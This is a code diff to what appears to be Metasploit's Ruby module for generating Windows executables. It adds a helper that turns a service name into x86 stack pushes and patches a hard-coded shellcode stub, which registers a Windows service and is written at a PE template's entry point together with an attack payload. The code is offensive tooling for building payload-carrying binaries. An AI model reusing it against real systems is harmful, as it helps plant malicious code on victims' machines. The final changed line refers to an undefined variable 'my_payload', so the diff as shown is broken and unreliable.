@@ -383,6 +383,27 @@ require 'msf/core/exe/segment_injector'
     return pe
   end
 
+  def self.string_to_pushes(str)
+    # Align string to 4 bytes
+    rem = (str.length) % 4
+    if (rem > 0)
+      str << "\x00" * (4 - rem)
+      pushes = ''
+    else
+      pushes = "h\x00\x00\x00\x00"
+    end
+    # string is now 4 bytes aligned with null byte
+
+    # push string to stack, starting at the back
+    while (str.length > 0)
+      four = 'h'+str.slice!(-4,4)
+      pushes << four
+    end
+
+    pushes
+  end
+
+
   def self.exe_sub_method(code,opts ={})
 
     pe = ''
@@ -398,6 +419,8 @@ require 'msf/core/exe/segment_injector'
 
         name ||= Rex::Text.rand_text_alpha(7)
         
+        pushed_service_name = string_to_pushes(name)
+
         # code_service could be encoded in the future
         code_service =
           "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
@@ -410,11 +433,11 @@ require 'msf/core/exe/segment_injector'
           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
           "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
           "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
-          "\x26\x07\xFF\xD5\x68"+name[4,3]+"\x00\x68"+name[0,4]+"\x89\xE1" +
+          "\x26\x07\xFF\xD5"+pushed_service_name+"\x89\xE1" +
           "\x8D\x85\xD0\x00\x00\x00\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
           "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
           "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED\xD6" +
-          "\x00\x00\x00\x68"+name[4,3]+"\x00\x68"+name[0,4]+"\x89\xE1\x8D" +
+          "\x00\x00\x00"+pushed_service_name+"\x89\xE1\x8D" +
           "\x85\xC9\x00\x00\x00\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
           "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
           "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5"
@@ -459,7 +482,10 @@ require 'msf/core/exe/segment_injector'
         end
 
         # put the shellcode at the entry point, overwriting template
-        pe[exe.rva_to_file_offset(exe.hdr.opt.AddressOfEntryPoint),code_service.length + code.length] = code_service + code
+        entryPoint_file_offset = exe.rva_to_file_offset(exe.hdr.opt.AddressOfEntryPoint)
+        my_payload_length = code_service.length + code.length
+        payload_service = code_service + code
+        pe[entryPoint_file_offset,my_payload] = payload_service
 
       when :dll
         max_length = 2048
